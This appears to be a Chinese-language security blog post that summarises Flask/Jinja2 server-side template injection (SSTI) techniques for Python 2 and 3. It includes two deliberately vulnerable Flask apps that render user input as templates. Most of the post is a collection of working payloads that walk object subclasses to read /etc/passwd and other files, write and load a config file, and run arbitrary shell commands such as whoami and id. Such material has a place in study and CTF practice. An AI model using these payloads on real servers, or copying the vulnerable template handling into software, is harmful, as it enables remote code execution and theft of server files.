---
layout: post
title: 2019-01-10-flask-ssti注入 py2,3注入总结和区别
categories: [web]
tags: [web]
fullview: false
comments: true
---

总结一下flask ssti的注入语句  
   
**代码**  
```
import uuid
from flask import Flask, request, make_response, session,render_template, url_for, redirect, render_template_string

app=Flask(__name__)
app.config['SECRET_KEY']=str(uuid.uuid4())

@app.route('/')
def index():
    try:
        username=session['username']
        return render_template('index.html',username=username)
    except Exception as e:
        return """<form action="%s" method='POST'>
        <input type='text' name='username' >
        <input type='password' name='password' >
        <input type='submit'>
        </form>""" % url_for("login")

@app.errorhandler(404)
def page_not_found(e):
    template='''
        {%% block body %%}
        <div class="center-content error">
        <h1>Oops! That page doesn't exist.</h1>
        <h3>%s</h3>
        </div>
        {%% endblock %%}
    '''%(request.url)
    return render_template_string(template),404

@app.route('/',methods=['POST'])
def login():
    username=request.form.get("username")
    password=request.form.get("password")
    if username=='admin' and not password==str(uuid.uuid4()):
        return "login failed"
    resp=make_response(redirect(url_for("index")))
    session['username']=username
    return resp
app.run(port=81,debug=True)

```

# 一.   
python2，python2相对来说简单，有file  

  
1.文件读取或者写入  
>     {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}  
>     {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}    



2.任意执行  
2.1每次执行都要先写然后编译执行
>     {{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg','w').write('code')}}  
>     {{ config.from_pyfile('/tmp/owned.cfg') }}  

2.2写入一次即可
>     {{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg','w').write('from subprocess import check_output\n\nRUNCMD = check_output\n')}}  
>     {{ config.from_pyfile('/tmp/owned.cfg') }}  
>     {{ config['RUNCMD']('/usr/bin/id',shell=True) }}    

2.3 不回显的  
>     http://127.0.0.1:9998/{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']('1+1')}}      
>     http://127.0.0.1/{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').system('whoami')")}}

**3.任意执行只需要一条指令**  

>     {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")}}(难受啊，老铁们，自己捣鼓了好久，这个任意执行，回显！)
     
-------
>     总结:通过某种类型(字符串:""，list:[]，int：1)开始引出，__class__找到当前类，__mro__或者__base__找到__object__，前边的语句构造都是要找这个。然后利用object找到能利用的类。还有就是{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')}}这种的，能执行，但是不会回显。一般来说，python2的话用file就行，python3则没有这个属性。  
>     
  

# 二. #

然后是python3   
  
因为python3没有file了，所以用的是open  

>     http://127.0.0.1/{{().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('d://whale.txt').read()}}和python2的位置不一样，问题不大，挨个测试就能找出位置在在哪。  


同样是一句指令任意执行:  

>     {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")}}

# 三. 比较不同的一种，单独拿出来了。  

```
#python3
#Flask version:0.12.2
#Jinja2: 2.10
from flask import Flask, request
from jinja2 import Template
app = Flask(__name__)
@app.route("/")
def index():
    name = request.args.get('name', 'guest')
    t = Template("Hello " + name)
    return t.render()
if __name__ == "__main__":
    app.run();

```    

**python3的时候**
#命令执行：  

>     {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
   
 
#文件操作  

>     {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}

**python2的时候。(同上，不过不是不回显，而是要看网页源代码才能看出来)**